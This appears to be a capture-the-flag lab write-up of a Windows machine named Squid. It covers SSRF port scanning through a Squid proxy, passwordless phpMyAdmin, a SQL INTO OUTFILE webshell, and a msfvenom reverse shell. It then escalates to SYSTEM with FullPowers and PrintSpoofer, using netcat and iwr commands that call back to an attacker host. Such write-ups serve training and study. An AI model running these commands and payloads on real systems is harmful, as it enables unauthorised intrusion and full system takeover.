#Windows #SquidProxy #SSRF #phpMyAdmin #SQLFileWrite #ServiceAccount #FullPowers #SeImpersonate #PrintSpoofer

## Overview

Squid is a Windows machine where a publicly facing Squid HTTP proxy is the only external entry point, and it becomes the tool used to reach an internal WampServer and its passwordless phpMyAdmin. From phpMyAdmin, a SQL `INTO OUTFILE` query writes a PHP uploader to the webroot, which gives code execution as `NT AUTHORITY\Local Service`. Privilege escalation runs two steps: `FullPowers.exe` restores the service account's stripped `SeImpersonatePrivilege`, and `PrintSpoofer` converts that privilege into a SYSTEM shell.

## Recon

### Nmap

```sh
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3128/tcp open  http-proxy    Squid http proxy 4.14
```

Only four ports externally. The Squid proxy on 3128 is both the attack surface and the pivot mechanism. SMB signing not required, but no obvious SMB foothold yet.

### Squid Proxy, Internal Port Discovery

The `spose.py` script uses Squid as a port scanner against itself, measuring response time differences to detect open internal ports:

```sh
python3 spose.py --proxy http://192.168.229.189:3128 --target 192.168.229.189
192.168.229.189 3306 seems OPEN
192.168.229.189 8080 seems OPEN
```

> **How Squid becomes a port scanner:** Squid forwards HTTP requests on behalf of clients. Pointing it at `127.0.0.1:<port>` with varying port numbers causes it to either connect (open port) or refuse (closed port), and the timing difference or response codes reveal which ports are listening internally. This is effectively server-side request forgery (SSRF), using the proxy's outbound connectivity to scan what would otherwise be an unreachable network.

With FoxyProxy configured to route through `192.168.229.189:3128`, browsing to `127.0.0.1:8080` revealed a WampServer.

## Foothold

### phpMyAdmin, Passwordless Root Login

The phpMyAdmin service was accessible at:

```
http://127.0.0.1:8080/phpmyadmin/
```

The WampServer installation used the default root configuration: no password. Login succeeded with `root` and a blank password field.

> **Why root-with-no-password is common on WampServer:** WampServer is a local development stack that ships with phpMyAdmin pre-configured for the MySQL `root` account with no password. Developers install it for local testing and never set a root password because it's "just local." When WampServer ends up on a machine with a Squid proxy in front of it, "local only" stops being true.

### SQL INTO OUTFILE → PHP File Uploader

With SQL execution rights as root, a PHP file-upload page was written directly to the WampServer webroot:

```sql
SELECT
"<?php echo '<form action=\"\" method=\"post\" enctype=\"multipart/form-data\">';
echo '<input type=\"file\" name=\"file\"><input name=\"_upl\" type=\"submit\" value=\"Upload\">';
if( $_POST['_upl'] == 'Upload' ) {
    if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
        echo 'Upload Done.';
    } else { echo 'Upload Failed.'; }
}?>"
INTO OUTFILE 'C:/wamp/www/uploader.php';
```

The upload form was then available at:

```
http://127.0.0.1:8080/uploader.php
```

A PHP reverse shell was generated and uploaded through this form:

```sh
msfvenom -p php/reverse_php LHOST=192.168.45.244 LPORT=443 -f raw -o shell.php
```

Triggering the shell:

```
http://127.0.0.1:8080/shell.php
```

```sh
rlwrap nc -lvnp 443
connect to [192.168.45.244] from (UNKNOWN) [192.168.229.189] 49928

whoami
nt authority\local service
```

```powershell
type local.txt
‹redacted›
```

## Privilege Escalation

### Step 1, FullPowers: Restoring SeImpersonatePrivilege

Service accounts like `Local Service` and `Network Service` run with a reduced token, `SeImpersonatePrivilege` and other rights are present in the account's full token but stripped from the shell token by default. `FullPowers.exe` exploits a scheduled task creation trick to obtain a fresh, unreduced token for the service account.

The shell was first upgraded using powercat over a new connection. Then `RunFromProcess` was used to create a local bind shell from within a privileged process context, and `FullPowers` was run from there:

```powershell
# Create bind shell from process context
.\rfp.exe 3636 C:\TOOLS\nc64.exe -l -p 9001 -e cmd

# Connect to bind shell
.\nc.exe 127.0.0.1 9001

# Download and run FullPowers
iwr -uri http://192.168.45.244/FullPowers.exe -OutFile fullpowers.exe
.\fullpowers.exe -c ".\nc.exe 192.168.45.244 8080 -e cmd" -z
[+] Got new token! Privilege count: 7
[+] CreateProcessAsUser() OK
```

The new shell had `SeImpersonatePrivilege` enabled:

```powershell
C:\Windows\system32>whoami /priv

SeAssignPrimaryTokenPrivilege   Replace a process level token   Enabled
SeImpersonatePrivilege          Impersonate a client after auth Enabled
SeCreateGlobalPrivilege         Create global objects           Enabled
```

> **Why service accounts have SeImpersonatePrivilege in the first place:** Windows grants `SeImpersonatePrivilege` to service accounts so they can impersonate the client on whose behalf they are acting (e.g., IIS impersonating a web request's auth context). An attacker with this privilege can force a privileged token owner (like SYSTEM) to authenticate to an attacker-controlled named pipe, then impersonate that SYSTEM token. This is the basis of the Potato and PrintSpoofer families of attacks.

### Step 2, PrintSpoofer: SeImpersonate to SYSTEM

With `SeImpersonatePrivilege` restored, PrintSpoofer created a named pipe and tricked the Print Spooler service (running as SYSTEM) into authenticating to it, capturing the SYSTEM token:

```powershell
iwr -uri http://192.168.45.244/PrintSpoofer.exe -OutFile printspoofer.exe
.\printspoofer.exe -c "nc 192.168.45.244 443 -e powershell"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
```

## Root / SYSTEM

```sh
rlwrap nc -lvnp 443
connect to [192.168.45.244] from (UNKNOWN) [192.168.229.189] 49945

PS C:\Windows\system32> whoami
nt authority\system
```

```powershell
PS C:\Users\Administrator\Desktop> type proof.txt
‹redacted›
```

## Takeaways

- **A Squid proxy is both attack surface and pivot tool.** `spose.py` turns the proxy into a port scanner against the host itself, one script, two open internal ports revealed.
- **Passwordless phpMyAdmin root plus `INTO OUTFILE` equals webshell.** MySQL's file-write capability is a shell in one SQL query when the web server runs from the same directory tree.
- **`FullPowers` restores what Windows strips from service account shells.** The shell token is a subset of the account's full token. `FullPowers` recovers it using a scheduled task trick, making `SeImpersonatePrivilege` usable again.
- **`SeImpersonatePrivilege` + PrintSpoofer = SYSTEM.** This chain is reliable on unpatched Windows 10 and Server 2016/2019. If WinPEAS shows `SeImpersonatePrivilege: Enabled` on a service account, PrintSpoofer is the first tool to try.
